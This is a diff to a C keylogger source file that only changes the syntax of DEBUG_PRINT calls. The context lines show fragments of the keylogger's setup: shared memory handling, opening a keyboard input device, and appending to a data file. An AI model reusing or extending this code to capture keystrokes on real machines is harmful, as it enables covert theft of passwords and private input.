@@ -25,7 +25,7 @@ void keylogger_allow()
 
 	if (fd_shm == -1)
 	{
-		DEBUG_PRINT((P_ERROR " [keylogger_allow] Error opening the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [keylogger_allow] Error opening the shared memory segment\n");
 
 		return;
 	}
@@ -35,7 +35,7 @@ void keylogger_allow()
 
 	if (aux == MAP_FAILED)
 	{
-		DEBUG_PRINT((P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n");
 
 		return;
 	}
@@ -54,7 +54,7 @@ void keylogger_deny()
 
 	if (fd_shm == -1)
 	{
-		DEBUG_PRINT((P_ERROR " [keylogger_deny] Error opening the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [keylogger_deny] Error opening the shared memory segment\n");
 
 		return;
 	}
@@ -64,7 +64,7 @@ void keylogger_deny()
 
 	if (aux == MAP_FAILED)
 	{
-		DEBUG_PRINT((P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n");
 
 		return;
 	}
@@ -83,7 +83,7 @@ void keylogger_end()
 
 	if (fd_shm == -1)
 	{
-		DEBUG_PRINT((P_ERROR " [keylogger_end] Error opening the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [keylogger_end] Error opening the shared memory segment\n");
 
 		return;
 	}
@@ -93,7 +93,7 @@ void keylogger_end()
 
 	if (aux == MAP_FAILED)
 	{
-		DEBUG_PRINT((P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n");
 
 		return;
 	}
@@ -122,7 +122,7 @@ int keylogger_init()
 	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
 	if (fd_shm == -1)
 	{
-		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error creating the shared memory\n"));
+		DEBUG_PRINT(P_ERROR " [KEYLOGGER] Error creating the shared memory\n");
 
 		return ERROR;
 	}
@@ -132,7 +132,7 @@ int keylogger_init()
 
 	if (error == -1)
 	{
-		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n");
 
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
@@ -143,7 +143,7 @@ int keylogger_init()
 												PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
 	if (shared_memory == MAP_FAILED)
 	{
-		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n"));
+		DEBUG_PRINT(P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n");
 
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
@@ -156,7 +156,7 @@ int keylogger_init()
 	// Configure the keylogger
 	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
 	{
-		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error opening device\n"));
+		DEBUG_PRINT(P_ERROR " [KEYLOGGER] Error opening device\n");
 
 		munmap(shared_memory, sizeof(*shared_memory));
 		shm_unlink(SHM_KEYLOGGER);
@@ -181,7 +181,7 @@ int keylogger_init()
 				file = fopen("keylogger_data.txt", "ab+");
 				if (!file)
 				{
-					DEBUG_PRINT((P_ERROR " [KEYLOGGER] No file?\n"));
+					DEBUG_PRINT(P_ERROR " [KEYLOGGER] No file?\n");
 
 					munmap(shared_memory, sizeof(*shared_memory));
 					shm_unlink(SHM_KEYLOGGER);
